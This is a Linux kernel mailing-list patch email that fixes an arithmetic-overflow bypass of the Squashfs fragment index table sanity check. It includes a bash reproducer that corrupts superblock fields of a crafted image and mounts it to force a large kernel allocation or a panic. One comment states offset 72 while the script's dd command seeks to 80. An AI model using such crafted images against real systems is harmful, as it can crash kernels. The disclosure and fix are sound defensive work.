Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.remote-ip=188.121.53.31
ARC-Seal: i=1; d=subspace.kernel.org; s=arc20261015; a=rsa-sha256; cv=none;
	t=1794440695;
	b=znJNvylLBdADiDi1Njw5QMfGWrbFBO9NK/nCDA82zlHAsW8x+Zng+vUaFemb9SQ32dxv
	 Kpaojr9SXTujJArIbnZSqcqMqCIUtIdJ4Rp1V/GraKAjSWVQX0tK0QyUHzkLQbWGB4GmM
	 cUS16vyu3BTywSppUg1/R4PCb+q91ElsvGxBQP3lBVegvoi/nA3jKd0iBMksWMeSwGKy7
	 ChmKPdlM0+f3jZB+IornuQynp6dIcFQQqRMbhXKE8JwT4NoHvVqSsQcK7/6T7jc75CE60
	 vuAo1oR8DOiVablLXO+AeXLpItd7f27kQ8AaoB3mzJ8tXvNyFkXfsYeouCB/wCa+OOQ==
ARC-Message-Signature: i=1; d=subspace.kernel.org; s=arc20261015;
	a=rsa-sha256; c=relaxed/relaxed; t=1794440695;
	h=DMARC-Filter:Received:DKIM-Signature:DKIM-Signature:X-CMAE-Analysis:
	 Feedback-ID:X-SECURESERVER-ACCT:From:To:Cc:Subject:Date:Message-ID:
	 X-Mailer:In-Reply-To:References:MIME-Version:
	 Content-Transfer-Encoding:X-CMAE-Envelope;
	bh=r9eLjveMin1D2ZLNPwxfKt5MBfGoC53sknDXJOavBvI=;
	b=WanbV9NyqdMYAuzKXvZzkqMrZF/BqXQZIgiVzpqNMCDhueVH8U0l95dLWXwgONdfDSD2
	 zWmyb2cgo/NOywh+6BS6xpI19OXx4P3nahXkyuDJCXoHylb1gohYAk03exoS6TaxjWFQs
	 RZ7m0g9c681ZXColgiXCCNqFcCF2PPmaKnsghztV23R+gbnZgiTWEP3Orx2bTtPGV3UxQ
	 uRNIfRhm1JSh3xdjF53K+ekqLy7tm2UZFRtyYWB6KKLdj8/6B+v55E2iM+IX6eAp70rcW
	 w49zG0vechnlSQ83VNhKo7SRCDSaD6vo2ZWDGv9lBAkOkrDOTQF/Ywxr+yHc8Z2u9jw==
ARC-Authentication-Results: i=1; smtp.subspace.kernel.org; 
	dmarc=pass header.from=squashfs.org.uk;
	spf=pass smtp.mailfrom=squashfs.org.uk;
	dkim=pass header.d=secureserver.net header.i=@secureserver.net header.a=rsa-sha256 header.s=secureserver2 header.b=slZ9jt9z;
	dkim=pass header.d=squashfs.org.uk header.i=@squashfs.org.uk header.a=rsa-sha256 header.s=secureserver1 header.b=Vuw5Z5FH;
	arc=none smtp.remote-ip=188.121.53.31
Received: from sxplsmtpa04-03.prod.sxb1.secureserver.net (sxplsmtpa04-03.prod.sxb1.secureserver.net [188.121.53.31])
	(using TLSv1.3 with cipher TLS_AES_256_GCM_SHA384 (256/256 bits)
	 key-exchange X25519 server-signature ECDSA (prime256v1) server-digest SHA256)
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 6053A60A5BE5
	for <linux-fsdevel@vger.kernel.org>; Wed, 11 Nov 2026 23:44:54 +0000 (UTC)
DMARC-Filter: OpenDMARC Filter v1.4.2 smtp.subspace.kernel.org 6053A60A5BE5
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=reject dis=none) header.from=squashfs.org.uk
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=squashfs.org.uk
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key, unprotected) header.d=secureserver.net header.i=@secureserver.net header.a=rsa-sha256 header.s=secureserver2 header.b=slZ9jt9z;
	dkim=pass (2048-bit key, unprotected) header.d=squashfs.org.uk header.i=@squashfs.org.uk header.a=rsa-sha256 header.s=secureserver1 header.b=Vuw5Z5FH
Received: from avalon.fritz.box ([82.69.79.175])
	by :SMTPAUTH: with ESMTPA
	id RHz6xtxIpLwCURHzbxAFYO; Wed, 11 Nov 2026 23:44:40 +0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=secureserver.net;
	s=secureserver2; t=1794440681;
	bh=r9eLjveMin1D2ZLNPwxfKt5MBfGoC53sknDXJOavBvI=;
	h=From:To:Cc:Subject:Date:In-Reply-To:References;
	b=slZ9jt9zKsp3dBYJMMbRtyfAd+/DEMndzCEDvgvZTKEX/Ne3B9AJFa06+kTlU6c3p
	 cEu5je+TfQUcytLZpzIWrJtrMI4ZWw9TfRvSiAi90ZOSnbPaPkZnAm5iu9DzKnMhDe
	 8PN4o9dJs0mFeCSQA6vmKwvMgRIfiTNp62tneUg+8nQPAOq/JD3pQFVQZdNV4xbqE0
	 DtwCfyjGft1FO+IExhrhKondr9bzwRIRTpL6erG/q3YY9ti09Qgnthk3vUN9SYdfW9
	 BYa83NkZVrvRmIelKG2LIKeWehNZ2+5AFjrcGpZlLUT2PHTOhbJgt/Uf+o4cZioAU6
	 axg9OWqbuN0Dg==
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=squashfs.org.uk;
	s=secureserver1; t=1794440681;
	bh=r9eLjveMin1D2ZLNPwxfKt5MBfGoC53sknDXJOavBvI=;
	h=From:To:Cc:Subject:Date:In-Reply-To:References;
	b=Vuw5Z5FHrV2mjjDcw4csqBdBWLOdz86DYe0C/GDsoXUIE6B6SLiaS1Mq/y1tl9rk3
	 YxzDMiw4Fjz+FP0K45odLRakmgqW013XFdntbA9292gYKvkhALk9AlSFN7EicM6jpu
	 Vy4parJRjH5Ifs1QXfHJM/WSnp1YmILBoA4SQqpW5v3nc84Ffrbz0NeQKKd+kTi2FR
	 UwwWxHppCnzTi0joLFgkOrxnUJuYpbA0guQB4KyAZ37OIgsh4ZCYa8hj4ZOsgEOhNL
	 LZ4I3o08XVxOOl9VV2cLozmXxvOaqF5UQTRDhnnWYWA8BOQ+LLUNpbv0s3TrFVk/dB
	 zFRCJaHPNkhag==
X-CMAE-Analysis: v=2.4 cv=XZYcX455 c=1 sm=1 tr=0 ts=6af4fde9
 a=84ok6UeoqCVsigPHarzEiQ==:117 a=84ok6UeoqCVsigPHarzEiQ==:17 a=FXvPX3liAAAA:8
 a=5M4-1oPrCebqpQMMblwA:9 a=UObqyxdv-6Yh2QiB9mM_:22
Feedback-ID: ca609814b9c996260fd6cf0fc2955db6:squashfs.org.uk:ssnet
X-SECURESERVER-ACCT: phillip@squashfs.org.uk
From: Phillip Lougher <phillip@squashfs.org.uk>
To: linux-kernel@vger.kernel.org,
	linux-fsdevel@vger.kernel.org,
	akpm@linux-foundation.org
Cc: Phillip Lougher <phillip@squashfs.org.uk>
Subject: [PATCH v2 09/22] Squashfs: fix fragment index table length too large exploit
Date: Wed, 11 Nov 2026 23:43:49 +0000
Message-ID: <20261111234402.252354-10-phillip@squashfs.org.uk>
X-Mailer: git-send-email 2.47.3
In-Reply-To: <20261111234402.252354-1-phillip@squashfs.org.uk>
References: <20261111234402.252354-1-phillip@squashfs.org.uk>
X-Mailing-List: linux-fsdevel@vger.kernel.org
List-Id: <linux-fsdevel.vger.kernel.org>
List-Post: <mailto:linux-fsdevel@vger.kernel.org>
List-Help: <mailto:linux-fsdevel+help@vger.kernel.org>
List-Subscribe: <mailto:linux-fsdevel+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:linux-fsdevel+unsubscribe@vger.kernel.org>
List-Owner: <mailto:linux-fsdevel+owner@vger.kernel.org>
Precedence: list
MIME-Version: 1.0
Content-Transfer-Encoding: 8bit
X-CMAE-Envelope: MS4xfIS/rEqvR2VCARW5p1B1K1zRvoA+GT9W5J9wbeh9iF98IlWIf9ckHucOnTUxxRD7MkThnTVvQhre4OSeeoJHGfoUDdVt6asyj/IEohAvI42csF8LCdYP
 IlJxKerqHzU8md0n5mdWa5jIxwWnCM5O10qgKH/cZu4oL1RxLjanQkSwToDY+EWWdFbE31ectfSJ8V1QQwkYJsBvXjYVFN4opOE+JLteLPpc2ljeTJsqdS6z
 LEPf+a/G6a+w0lbjiOQ7QPRJZ+uwaH6O7R6DFr98a0Cr0mkqnEAgiOq9YnT1H2vUxZAwL1ZIxh/z5A73tDAVvzckVyaTqWWVqoQUur94sa8=

An attacker can manipulate the fragment count and the fragment table
start values in the superblock, and force the code to kmalloc()
a 4 Mbyte memory region, or try to allocate larger values which
will fail with a warning, and which will panic the kernel if panic on
warn is set.

If the allocation succeeds, these invalid values will be caught when the
code tries to read the data from disk, but, this leaves a small time
window where the 4 Mbyte block is allocated before being freed when
the mount of the filesystem fails.

The exploit relies on arithmetic overflow to evade the following sanity
check:

	if (fragment_table_start + length > next_table)

Specifically, the values of fragment_table_start and length can be
chosen so that they overflow an unsigned long long, and so appear less
than next_table.

Typically, the maximum memory that can be allocated with kmalloc() is
4 Mbytes.  So if length is 4 Mbytes, this means fragment_table_start
needs to be 2^64 - 4 Mbytes, to achieve overflow and produce a zero
length.

This value is beyond the end of any block device, because the maximum
block device is 2^63 - 512 in size (LLONG_MAX >> 9 sectors of 512
bytes).

In practice this means such a large value will be caught when the code
immediately after allocation tries to read the data off disk:

 	table = squashfs_read_table(sb, fragment_table_start, length);

However, the code should check for validity before allocating a large
kmalloc() area, because such allocations can cause memory pressure or
cause the kernel to panic.

This commit checks that fragment_tables_size is not too large, and
ensures arithmetic overflow does not occur.

It also makes the sanity check more exacting by utilising the fact that
there should be zero gap between the end of the fragment index table and
the next table.

Reproducer
=========

The following script if the eploit works, will fail with the mount
error

mount: attempt to access beyond end of device

=================================================================
#!/bin/bash

ARGS="-quiet -no-progress"

finish() {
	popd 2>&1 > /dev/null
	rm -rf $DIR
	exit 1
}

# Create a Squashfs filesystem with a single file.
#
DIR=$(mktemp -d)

pushd $DIR 2>&1 > /dev/null

echo Create the Squashfs filesystem

if ! mksquashfs - img.sqsh -p "/ d 0777 0 0" -p "/file f 0777 0 0 echo hello" $ARGS; then
	echo Failed to create Squashfs filesystem
	finish

fi

# The fragments field (fragment count) in the superblock is at offset
# 16 bytes.
#
# Over-write the fragments count with 268,435,456 little-endian.
# This will make the kernel try to kmalloc() 4 Mbytes to hold the
# fragment index table.
#

# Write 268,435,456 in little-endian format to file
/usr/bin/echo -en "\x00\x00\x00\x10" > file

# Over-write the fragments count in the superblock
echo Over-write the fragments count in the superblock

dd bs=1 seek=16 if=file of=img.sqsh count=4 conv=notrunc status=none

# The fragment table start (start of the index table) in the superblock
# is at offset 72 bytes.
#
# Over-write the value with 2^64 - 4 Mbytes little-endian.
# This value with the index table length will overflow an unsigned
# long long, giving the value 0.  This will evade the sanity check.

# Write 2^64 - 4 Mbytes in little-endian format to file
/usr/bin/echo -en "\x00\x00\xc0\xff\xff\xff\xff\xff" > file

# Over-write the fragment table start in the superblock
echo Over-write the fragment table start in the superblock

dd bs=1 seek=80 if=file of=img.sqsh count=8 conv=notrunc status=none

# Mount the filesystem to /mnt
echo Mount the filesystem to /mnt

# If the eploit works, the mount will fail with
# mount: attempt to access beyond end of device

if ! mount -t squashfs img.sqsh /mnt; then
	echo Mount of Squashfs filesystem failed
	finish
fi

popd 2>&1 > /dev/null

rm -rf $DIR
=================================================================

Fixes: 1cac63cc9b2f ("Squashfs: add sanity checks to fragment reading at mount time")
Signed-off-by: Phillip Lougher <phillip@squashfs.org.uk>
---
 fs/squashfs/fragment.c | 8 ++++----
 1 file changed, 4 insertions(+), 4 deletions(-)

diff --git a/fs/squashfs/fragment.c b/fs/squashfs/fragment.c
index e945d045d55e..9f63e5b5c513 100644
--- a/fs/squashfs/fragment.c
+++ b/fs/squashfs/fragment.c
@@ -68,11 +68,11 @@ __le64 *squashfs_read_fragment_index_table(struct super_block *sb,
 	__le64 *table;
 
 	/*
-	 * Sanity check, length bytes should not extend into the next table -
-	 * this check also traps instances where fragment_table_start is
-	 * incorrectly larger than the next table start
+	 * The computed size of the index table (length bytes) should exactly
+	 * match the table start and end points
 	 */
-	if (fragment_table_start + length > next_table)
+	if (fragment_table_start >= next_table ||
+				length != (next_table - fragment_table_start))
 		return ERR_PTR(-EINVAL);
 
 	table = squashfs_read_table(sb, fragment_table_start, length);
-- 
2.47.3

